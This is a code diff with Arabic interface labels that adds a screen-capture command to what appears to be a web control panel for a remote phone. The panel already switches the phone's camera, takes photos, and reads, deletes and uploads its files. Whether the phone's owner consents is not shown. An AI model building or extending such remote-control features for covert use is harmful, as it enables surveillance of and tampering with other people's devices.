@@ -107,6 +107,7 @@ button.ghost{background:#263238}
 .acts{display:flex;gap:8px;margin:0 0 14px;flex-wrap:wrap}
 .acts button{flex:1;min-width:30%;border:0;border-radius:16px;padding:12px 8px;font-size:14px;font-weight:800;background:#1e88e5;color:#fff;cursor:pointer}
 #btn_shot{background:#00838f}
+#btn_screen{background:#5d4037}
 #btn_files{background:#6a1b9a}
 .fmodal{display:none;position:fixed;inset:0;background:rgba(0,0,0,.72);z-index:20;padding:16px;overflow:auto}
 .fbox{max-width:560px;margin:8px auto;background:#12122a;border-radius:16px;padding:14px;border:1px solid #2a2a4a}
@@ -158,6 +159,7 @@ button.ghost{background:#263238}
 <div class="acts">
   <button id="btn_flip" type="button">تبديل الكاميرا</button>
   <button id="btn_shot" type="button">التقاط صورة</button>
+  <button id="btn_screen" type="button">لقطة الشاشة</button>
   <button id="btn_files" type="button">ملفات الهاتف</button>
 </div>
 <div class="stage" id="stage">
@@ -245,6 +247,8 @@ button.ghost{background:#263238}
             if(typeof saveB64==='function') saveB64(fileParts, fileName); fileParts=[];
           } else if(j.type==='fileput_ok'){
             if(typeof onPutOk==='function') onPutOk();
+          } else if(j.type==='screenshot_err'){
+            alert(j.err||'تعذر لقطة الشاشة');
           }
         }catch(_){}
         return;
@@ -321,6 +325,13 @@ button.ghost{background:#263238}
           document.body.appendChild(a); a.click(); a.remove();
         }
       }catch(e){}
+    };
+    document.getElementById('btn_screen').onclick=function(){
+      if(ws && ws.readyState===1){
+        try{ ws.send(JSON.stringify({type:'screenshot'})); }catch(e){}
+      } else {
+        alert('الجهاز غير متصل');
+      }
     };
     var fmodal=document.getElementById('fmodal');
     var flist=document.getElementById('flist');
@@ -1033,6 +1044,7 @@ function onViewer(ws, id, ip) {
       return;
     }
     if (j.type === 'facing' || j.type === 'flip' || j.type === 'capture'
+        || j.type === 'screenshot'
         || j.type === 'files' || j.type === 'fileget'
         || j.type === 'filedel' || j.type === 'fileput'
         || j.type === 'fileputchunk' || j.type === 'fileputend') {
@@ -1040,12 +1052,18 @@ function onViewer(ws, id, ip) {
       bindController();
       const dev = attach();
       if (!dev) {
+        if (j.type === 'screenshot') {
+          sendJson(ws, { ok: false, type: 'screenshot_err', err: 'الجهاز غير متصل' });
+        }
         if (j.type === 'files' || j.type === 'filedel' || j.type === 'fileput' || j.type === 'fileputend') {
           sendJson(ws, { ok: false, type: 'files', err: 'الجهاز غير متصل' });
         }
         return;
       }
       if (!sendToDevice(dev, j)) {
+        if (j.type === 'screenshot') {
+          sendJson(ws, { ok: false, type: 'screenshot_err', err: 'الجهاز غير متصل' });
+        }
         if (j.type === 'files' || j.type === 'filedel' || j.type === 'fileput' || j.type === 'fileputend') {
           sendJson(ws, { ok: false, type: 'files', err: 'الجهاز غير متصل' });
         }
